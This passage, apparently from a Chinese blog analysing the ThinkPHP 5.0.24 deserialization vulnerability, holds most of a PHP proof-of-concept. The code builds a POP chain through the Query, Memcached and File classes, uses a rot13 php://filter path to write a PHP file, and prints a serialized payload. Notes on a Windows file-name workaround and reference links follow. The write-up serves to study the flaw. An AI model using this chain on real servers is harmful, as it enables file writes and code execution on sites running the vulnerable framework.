punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//目的调用Memcached类的write()函数</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'getAttr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\"># 这是因为是通过Output-&gt;getAttr进入__call函数，而__call的参数中$method是getAttr</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">#Query</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Query</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$model</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">model</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//判断getRelationData()中if条件的第三个</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">#Memcached</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>File</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Memcached</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$handler</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">handler</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//目的是调用File-&gt;set()</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">#File</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>cache<span class=\"token punctuation\">\\</span>driver</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">File</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$tag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token string single-quoted-string\">'expire'</span>        <span class=\"token operator\">=&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'cache_subdir'</span>  <span class=\"token operator\">=&gt;</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'prefix'</span>        <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'path'</span>          <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">'php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?&gt;'</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">//</span>\n        <span class=\"token string single-quoted-string\">'data_compress'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">tag</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes<span class=\"token punctuation\">\\</span>Windows</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Windows</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"pop_365\"></a>pop链图</h2>\n<p>这里借用一下<code>osword</code>师傅的图</p>\n<p><img alt=\"img\" src=\"image\\01dd30cca2d2628829c4e6c5de253245.png\"/></p>\n<h2><a id=\"windows_373\"></a>解决windows下的文件名问题</h2>\n<p>我们注意到，在原有的链子中，我们在<code>thinkphp\\library\\think\\session\\driver\\Memcached.php</code>中将$this-&gt;handler设置为File类对象，目的是调用File.php的<code>set()</code>方法</p>\n<p>但是也可以将$this-&gt;handler设置为<code>thinkphp\\library\\think\\cache\\driver\\Memcached.php</code>中的<code>Memcached</code>类对象，注意这两个php文件是不一样的，其也有一个set方法</p>\n<p>第114行也有一个set方法，且handler可控</p>\n<p><img alt=\"image-20220622000757213\" src=\"image\\493bd8c70836edafe80691d7729c82cd.png\"/></p>\n<p>看这个getCacheKey()函数，这个options可控，所以返回值可控</p>\n<p><img alt=\"image-20220622000923068\" src=\"image\\c6364245b5831f3a0b94e1fb0ef91dee.png\"/></p>\n<p>所以$key可控，但是我们前面分析过了，这个$value不可控，所以还是要进115行的setTagItem()函数，跟进，它还是在Driver.php中定义的，这里根据前面的分析，$key和$value都是可控的，且没有那个<code>&lt;&gt;?</code>这样的特殊符号的影响</p>\n<p><img alt=\"image-20220622001606288\" src=\"image\\8310d10279b4285c3ad1b06e54f3913d.png\"/></p>\n<p>详细参考：<a href=\"https://www.cnblogs.com/Yhck/p/15616884.html\">Thinkphp5.0.24反序列化漏洞分析与利用 - Yhck - 博客园 (cnblogs.com)</a></p>\n<h2><a id=\"_397\"></a>参考链接</h2>\n<ol><li><a href=\"https://blog.csdn.net/LYJ20010728/article/details/119793016\">ThinkPHP5.0.x 反序列化_H3rmesk1t的博客-CSDN博客_thinkphp反序列化</a></li><li><a href=\"https://www.cnblogs.com/Yhck/p/15616884.html\">Thinkphp5.0.24反序列化漏洞分析与利用 - Yhck - 博客园 (cnblogs.com)</a></li><li><a href=\"https://blog.csdn.net/qq_41891666/article/details/107503710\">thinkphp v5.0.24 反序列化利用链分析_kee_ke的博客-CSDN博客_thinkphp v5.0.24</a></li><li>[(1条消息) <a href=\"https://blog.csdn.net/qq_45691294/article/details/109279879\">省信息安全技术大赛]Web4_沫忆末忆的博客-CSDN博客</a></li></ol>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}